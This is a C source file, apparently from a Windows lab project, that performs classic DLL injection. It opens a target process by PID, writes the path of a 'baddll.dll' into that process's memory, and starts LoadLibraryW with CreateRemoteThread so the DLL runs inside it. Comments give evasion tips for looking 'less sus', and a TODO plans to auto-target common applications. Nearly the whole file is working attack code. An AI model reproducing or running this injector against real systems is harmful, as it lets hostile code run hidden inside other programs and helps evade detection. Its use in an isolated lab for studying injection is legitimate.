#include <stdio.h>
#include <Windows.h>
/**
 * Process Injection Steps
 * 1. Create process or attach to existing one
 * 2. Allocate some memory within that process
 * 3. Write the memory to the process
 * 4. Create a thread in the process that runs the code embedded in the process
*/

const char* k = "[+]";
const char* i = "[*]";
const char* e = "[-]";
const char* l = "---------------------------------------------------------------------------";

DWORD PID, TID = NULL;
HANDLE hProcess, hThread = NULL;
LPVOID rBuffer = NULL;
HMODULE hKernel32 = NULL;

//CHANGE FOR LOACL ENV LOCATION
wchar_t dllPath[MAX_PATH] = L"C:\\...\\...\\win-dll-inj\\build\\baddll.dll";
size_t dllPathSize = sizeof(dllPath);

const int UNLEN = 20;
wchar_t username[UNLEN + 1];
DWORD size = UNLEN + 1;

int main(int argc, char* argv[]){
    if(GetUserNameW(username, &size)){
        if (wcscmp(username, L"vagrant") == 0){
            wchar_t dllPath[MAX_PATH] = L"C:\\Users\\vagrant\\Desktop\\baddll.dll";
            printf("%s dll path switched\n", i);
        }
    }
    
    //*if there is no PID
    //!NEED TO PASS IN AUTO PID MAYBE SEARCH FOR PID OF MSPAINT, NOTES, OR OTHER COMMON APPLICATION
    if (argc < 2){
        printf("%s usage: program.exe <PID>", e);
        return EXIT_FAILURE;
    };

    //*get the PID from the arg
    PID = atoi(argv[1]);
    printf("%s trying to open a handle to process <%ld>\n", i, PID);
    
    //*open the handle to process
    //less sus if you get min access rights
    hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        PID
        );

    //*check if the handle is valid
    if(hProcess == NULL){
        printf("%s couldn't get handle to the process <%ld> error: %ld", e, PID, GetLastError());
        return EXIT_FAILURE;
    }else{
        printf("%s got a handle to process\n\\--0x%p\n", k, hProcess);
    }

    //* allocate bytes to process memory
    //looks less sus if flProtect is min access rights
    rBuffer = VirtualAllocEx(
        hProcess,
        NULL,
        dllPathSize,
        (MEM_RESERVE | MEM_COMMIT),
        PAGE_READWRITE 
    );

    printf("%s allocated %zu-bytes with PAGE_READWRITE permissions\n",k, dllPathSize);


    //*Write the process to memory
    if(!WriteProcessMemory(
        hProcess,
        rBuffer,
        dllPath,
        dllPathSize,
        NULL
    )){
        printf("%s couldn't write process to memory, error: %ld",e, GetLastError());
        return EXIT_FAILURE;
    };

    printf("%s wrote %zu-bytes to process memory\n", k, dllPathSize);


    //* Create thread to run the payload
    hKernel32 = GetModuleHandleW(L"Kernel32");

    if(hKernel32 == NULL){
        printf("%s failed to get a handle to Kernel32.dll: %ld", e, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    printf("%s got a handle to the thread <%ld>\n\\---0x%p\n",k, TID, hKernel32);

    //*Get the address to start routine
    LPTHREAD_START_ROUTINE startThis = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
    printf("%s got the address of LoadLibrary()\n\\---0x%p\n", k, startThis);

    //*start thread
    hThread = CreateRemoteThread(hProcess, NULL, 0, startThis, rBuffer, 0, &TID);
    if(hThread == NULL){
        printf("%s failed to get a handle to thread: %ld", e, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    printf("%s got a handle to newly created thread <%ld> \n\\---0x%p\n", k, TID, hThread);
    printf("%s waiting for thread to finish\n", i);
    WaitForSingleObject(hThread, INFINITE);
    printf("%s thread finished executing\n",k);


    printf("%s\n%s closing handles\n%s\n", l, i, l);
    CloseHandle(hProcess);
    CloseHandle(hThread);
    printf("%s done", k);

    return EXIT_SUCCESS;
}